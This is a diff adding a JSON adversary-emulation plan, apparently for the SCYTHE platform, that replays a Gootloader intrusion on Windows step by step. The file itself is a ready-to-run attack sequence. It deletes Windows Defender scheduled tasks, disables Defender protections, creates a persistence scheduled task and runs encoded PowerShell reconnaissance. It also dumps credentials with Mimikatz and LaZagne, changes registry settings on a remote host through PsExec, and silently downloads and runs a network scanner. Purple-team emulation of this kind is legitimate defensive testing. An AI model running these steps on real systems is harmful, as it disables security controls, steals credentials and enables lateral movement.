@@ -1,0 +1,391 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "SEO Poisoning attack from February 2022. https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story\n\nWARNING: RUNNING THIS EMULATION WILL DELETE SCHEDULED TASKS FOR WINDOWS DEFENDER!",
+        "display_name": "Gootloader_Dangerous",
+        "name": "Gootloader_Dangerous",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "hostname",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c echo %userdomain%",
+                "type": "message"
+            },
+            "6": {
+                "name": "Note",
+                "type": "assign",
+                "value": "Update these credentials before testing lateral movement."
+            },
+            "7": {
+                "name": "Password",
+                "type": "assign",
+                "value": "%Password%"
+            },
+            "8": {
+                "name": "NTLMHASH",
+                "type": "assign",
+                "value": "%HASH%"
+            },
+            "9": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "DISCOVERY"
+            },
+            "10": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/threats/Gootloader/sharphound.ps1\" --dest c:\\users\\public\\sharphound.ps1",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -exec bypass -EncodedCommand LgAgACAAYwA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXABzAGgAYQByAHAAaABvAHUAbgBkAC4AcABzADEAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==",
+                "rtags": [
+                    "att&ck-technique:T1087",
+                    "att&ck-technique:T1560",
+                    "att&ck-technique:T1482",
+                    "att&ck-technique:T1069",
+                    "att&ck-technique:T1018",
+                    "att&ck-technique:T1033",
+                    "att&ck-technique:T1046",
+                    "att&ck-technique:T1027"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell WMIC /NODE:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
+                "rtags": [
+                    "att&ck-technique:T1518.001"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "PERSISTENCE"
+            },
+            "14": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd $u=$env:USERNAME; Register-ScheduledTask $u -In (New-ScheduledTask -Ac (New-ScheduledTaskAction -E ([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) -Ar (\"-w h -e \"+$a)) -Tr (New-ScheduledTaskTrigger -AtL -U $u));",
+                "rtags": [
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "EVASION"
+            },
+            "17": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f | schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f | schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f | schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f",
+                "rtags": [
+                    "att&ck-technique:T1562.001"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "19": {
+                "function": "ifelse",
+                "next": "21",
+                "step": "18",
+                "type": "decision",
+                "value": "High",
+                "verb": "is not"
+            },
+            "20": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Set-MpPreference -DisableRealtimeMonitoring $true | Set-MpPreference -DisableArchiveScanning $true | Set-MpPreference -DisableBehaviorMonitoring $true | Set-MpPreference -DisableIOAVProtection $true | Set-MpPreference -DisableIntrusionPreventionSystem $true | Set-MpPreference -DisableScanningNetworkFiles $true | Set-MpPreference -MAPSReporting 0 | Set-MpPreference -DisableCatchupFullScan $True | Set-MpPreference -DisableCatchupQuickScan $True",
+                "rtags": [
+                    "att&ck-technique:T1562.001"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell $pipe = New-Object System.IO.Pipes.NamedPipeServerStream 'msagent_id','Out'",
+                "rtags": [
+                    "att&ck-technique:T1071"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell $pipe = New-Object System.IO.Pipes.NamedPipeServerStream '1ea887','Out'",
+                "rtags": [
+                    "att&ck-technique:T1071"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CREDENTIAL ACCESS"
+            },
+            "24": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/threats/Gootloader/Invoke-Mimikatz.ps1\" --dest c:\\users\\public\\mi.ps1",
+                "rtags": [
+                    "att&ck-technique:T1212"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "26": {
+                "function": "ifelse",
+                "next": "29",
+                "step": "25",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('. c:\\users\\public\\mi.ps1; Invoke-Mimikatz -ComputerName $(4).response[\"result\"].strip(\"\\r\\n\")'))",
+                "rtags": [
+                    "att&ck-technique:T1212"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -nop -noni -exec bypass -EncodedCommand $(27).response[\"result\"].strip(\"\\r\\n\")",
+                "rtags": [
+                    "att&ck-technique:T1027",
+                    "att&ck-technique:T1555",
+                    "att&ck-technique:T1003.001"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/threats/Gootloader/lazagne.exe\" --dest c:\\users\\public\\ls.exe",
+                "rtags": [
+                    "att&ck-technique:T1212"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"cd C:\\Users\\Public && start ls.exe all -oN -output C:\\Users\\Public\"",
+                "rtags": [
+                    "att&ck-technique:T1555",
+                    "att&ck-technique:T1003.001"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Enable LSA"
+            },
+            "32": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/threats/Gootloader/PsExec.exe\" --dest C:\\Users\\Public\\psexec.exe",
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd cd C:\\Users\\Public; .\\psexec.exe -accepteula \\\\'$(4).response[\"result\"].strip(\"\\r\\n\")' -u '$(3).response[\"result\"].strip(\"\\r\\n\")' -p '$(7).response' reg add \"HKLM\\System\\CurrentControlSet\\Control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0",
+                "rtags": [
+                    "att&ck-technique:T1021.001",
+                    "att&ck-technique:T1021.006"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "35": {
+                "function": "ifelse",
+                "next": "42",
+                "step": "34",
+                "type": "decision",
+                "value": "high",
+                "verb": "is not"
+            },
+            "36": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell Start-BitsTransfer -Source https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe -Destination C:\\Users\\Public\\Advanced_IP_Scanner_2.5.4594.1.exe",
+                "rtags": [
+                    "att&ck-technique:T1197"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"cd C:\\Users\\Public && .\\Advanced_IP_Scanner_2.5.4594.1.exe /VERYSILENT /NORESTART\"",
+                "rtags": [
+                    "att&ck-technique:T1595.001"
+                ],
+                "type": "message"
+            },
+            "38": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEAN UP"
+            },
+            "39": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"taskkill /F /IM advanced_ip_scanner.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"del C:\\Users\\Public\\Advanced_IP_Scanner_2.5.4594.1.exe",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "41": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"wmic product where name=\"Advanced IP Scanner 2.5.1\" call uninstall /nointeractive\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "42": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"del C:\\Users\\Public\\ls.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "43": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"del C:\\Users\\Public\\mi.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "44": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"del C:\\Users\\Public\\sharphound.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "45": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"del C:\\Users\\Public\\psexec.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "46": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg delete HKLM\\System\\CurrentControlSet\\Control\\lsa /v DisableRestrictedAdmin /f",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "47": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Set-MpPreference -DisableRealtimeMonitoring $False | Set-MpPreference -DisableArchiveScanning $False |  Set-MpPreference -DisableBehaviorMonitoring $False | Set-MpPreference -DisableIOAVProtection $False | Set-MpPreference -DisableIntrusionPreventionSystem $False | Set-MpPreference -DisableScanningNetworkFiles $False | Set-MpPreference -MAPSReporting 1 | Set-MpPreference -DisableCatchupFullScan $False | Set-MpPreference -DisableCatchupQuickScan $False",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "48": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
